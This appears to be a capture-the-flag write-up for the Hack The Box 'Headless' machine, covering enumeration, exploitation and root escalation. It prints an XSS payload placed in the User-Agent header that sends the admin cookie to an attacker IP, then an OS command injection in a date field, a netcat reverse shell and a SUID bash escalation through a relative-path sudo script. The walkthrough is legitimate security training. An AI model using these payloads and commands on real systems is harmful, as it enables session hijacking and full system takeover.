# Headless

![1](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/4543266d-1c02-4802-9660-cb05049c426f)

## Enumeration

We use nmap for a general and quick scan for all open ports, and we discover that ports 22 (SSH) and 5000 (upnp) are open.
With this info, we now proceed to do an intense scan in this two ports in order to find out servicies and versions.

![2](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/e347f79f-8c92-4d0a-a49b-cc8c42c27fc1)
![3](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/b002b235-c9ba-487b-8c8c-913f79c44a91)

We can see that SSH version is >7.7 so there are no known vulnerabilities related.

For port 5000, although in the first scan nmap showed it was an upnp service, now with this deeper scan we know that a webserver is being hosted with Werkzeug/2.2.2 and Python/3.11.2. 
There are two important  details we can not miss:

- There is a “Set-Cookie” header refering to a “is_admin” which could be useful in the near future
- Nmap noticed that the service on port 5000 responded not only to regular web requests but also to RTSP requests and got an error message wich could also be useful.

RTSP (Real Time Streaming Protocol) is a network control protocol designed for use in entertainment and communication systems to control streaming media servers.

We can use the browser to navigate to the url and port to see the webpage:

![4](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/5bd70aaa-e1d0-4b28-9932-72510705d6fa)

There is a section in /support that holds a form data and is sent with the same is_admin cookie:
{
  fname=a&lname=a&email=a%40gmail.com&phone=a&message=a
}
but it does not redirect to any page, just reloads the same one.

## Exploitation

At this stage it would be useful to do directory busting in order to see if there are hidden directories in the webserver. Using wfuzz we come up with a /dashboard.

When we manually go there with the browser we get a 401 code:

![5](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/2bbbaaa7-23df-45f1-84c2-5a328bb41e1c)

If we use curl without the is_admin cookie we get a 500 internal server error code.

Lets investigate the cookie is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs 
The first part (before the dot) corresponds to the word user:

![6](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/a69dba25-57fb-48ad-9710-5582408b0b21)

The second part we cant figure out what encoding it uses.

At this point we ran out of options so we should go back to investigate the previous ones.
The support page contains a “message” (textarea input) which could be interesting and potential to vulnerabilities if not sanitized correctly.

![7](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/3b575946-a005-40e3-8cd7-3cd6665d77bf)

If we try to inject <> chars the server flags the comment as forbbiden and displays the warning page so we should try to ofuscate and evade the defensive strategy.
After more investigation, we find out that the server looks for at least one < char and one >. If it has  only < chars or only > chars it will not flag the comment as a hacking attempt.

Using unicode, urlencode and HTML entities to ofuscate the < and > chars will not work, so we have to try another alternative.
Looking at the “Hacking Attempt Detected” image we realise that the User-Agent header could be modified by us in order to inject the XSS payload that would be executed when writing a comment that is flagged as dangerous. 

We will be using BurpSuite with FoxyProxy for intercepting dinamically the request and changing the User-Agent header:

![8](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/ca4ed703-87bb-41d1-86ed-27d9efdf2666)
![9](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/851253ac-3423-4001-80da-f50729b7e0ec)

Perfect! Now we can use the XSS vulnerability to retrieve the “is_admin” cookie to our server.

`<script>document.write('<img src="[http://10.10.14.217:8000/?c='+document.cookie+'](http://10.10.14.217:8000/?c=%27+document.cookie+%27)" />');</script>`

![10](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/f7fa5b91-e1cc-4030-b4b3-4f0db2e20d46)
![11](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/0fda5fa2-6838-438e-85cf-187dacd792e7)

Keep in mind that because we already have a session cookie (the one identifying us as a user), we will first receive the preexistent cookie, but dont panic, the admin cookie will then be received after a few seconds.
As we expected, the first part of the admin cookie is the word “admin” in base64:

![12](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/77849aaa-cfca-40aa-98bb-3a3a7b9c8e00)

Now with the admin cookie we are able to access the /dashboard directory, where we can look up a specific day and see if the systems were up and running.

![13](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/7e7427e0-aeea-4978-9ec3-3ae71acbf2a3)

If we intercept again the request with burpsuite we can see that there is only one input field called date. We should test now if its vulnerable to some kind of injection:

![14](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/3a110565-4a03-4dc0-beb8-8bfd82065796)

Perfect! We find an OS command injection vulnerability. Now we can establish a reverse shell. In order to know which programs the victims pc has, we can use the following command:
`date=2023-09-15;ls /usr/bin | grep {program}`

After checking it has netcat, we can use it to generate the rev shell and…

![15](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/88d76625-36fa-4954-b676-30f819fb324d)

Boom! We now have a remote connection.

## Privilige escalation

In /home we have the user.txt flag

With the command `sudo -l` we can see what binaries we could execute as if we were root, and we have one match: binary /usr/bin/syscheck

![16](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/e7ced48f-95a3-42c5-a6b0-86b30bdc4c61)

It looks like its trying to execute a .sh file in order to start the database. If we look closely, it is using a ./ relative path, so we could modify the existing [initdb.sh](http://initdb.sh) file that is in our /home directory to escalate our priviliges.

Our initdb.sh file should look like this: 

```bash
chmod u+s /bin/bash
```

Now the bash binary has the SUID permission, and with bash -p we can enter the bash session as root

![17](https://github.com/aguspatur22/Hack-the-box-writeups/assets/50930830/3355f215-881e-47b2-bee0-27003e014ee7)

### Pwned!
